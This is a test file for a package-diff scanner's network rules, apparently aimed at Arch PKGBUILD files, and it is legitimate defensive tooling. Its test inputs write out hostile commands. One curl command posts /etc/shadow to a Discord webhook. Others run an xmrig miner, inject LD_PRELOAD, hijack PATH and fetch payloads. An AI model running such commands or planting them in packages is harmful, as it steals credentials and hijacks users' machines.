import { describe, expect, it } from 'vitest';
import { NETWORK_RULES } from './network.rules';
import { addedOnlyDiff, makeChange, ruleById } from './test-support';

describe('network rules', () => {
  it.each([
    ['URL-001', 'source=("http://192.0.2.1/payload")'],
    ['URL-002', 'source=("https://bit.ly/abc123")'],
    ['URL-003', 'source=("https://myhost.duckdns.org/x")'],
    ['URL-004', 'source=("https://xn--80ak6aa92e.com/")'],
    ['CAUR-ONION-URL', 'curl http://olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion'],
    ['EXFIL-003', 'curl -X POST -d @/etc/shadow https://discord.com/api/webhooks/123/token'],
    ['EXFIL-003', 'curl https://api.telegram.org/bot123:token/sendMessage'],
    ['CRYPTO-001', 'xmrig -o stratum+tcp://pool.example:3333'],
    ['CRYPTO-002', 'install -Dm755 xmrig "$pkgdir"/usr/bin/xmrig'],
    ['ENV-001', 'export LD_PRELOAD=/usr/lib/libinject.so'],
    ['ENV-002', 'PATH=/tmp/bin:$PATH'],
    ['ENV-002', 'export PATH=/tmp/bin:$PATH'],
    ['HIDDEN-002', '/tmp/.cache/payload.sh'],
    ['INSTALL-003', 'curl -o /tmp/x https://example.org'],
    ['NET-001', 'source=("http://example.org/tarball")'],
  ])('flags %s for %j', (id, line) => {
    const options = id === 'INSTALL-003' ? { new_path: 'foo/foo.install' } : {};
    expect(ruleById(NETWORK_RULES, id).check(makeChange(addedOnlyDiff([line]), options))).not.toBeNull();
  });

  it('does not flag network access outside install scriptlets for INSTALL-003', () => {
    const change = makeChange(addedOnlyDiff(['curl -o /tmp/x https://example.org']), {
      new_path: 'foo/PKGBUILD',
    });
    expect(ruleById(NETWORK_RULES, 'INSTALL-003').check(change)).toBeNull();
  });

  it('does not flag https sources', () => {
    const change = makeChange(addedOnlyDiff(['source=("https://example.org/tarball.tar.gz")']));
    expect(ruleById(NETWORK_RULES, 'NET-001').check(change)).toBeNull();
  });
});
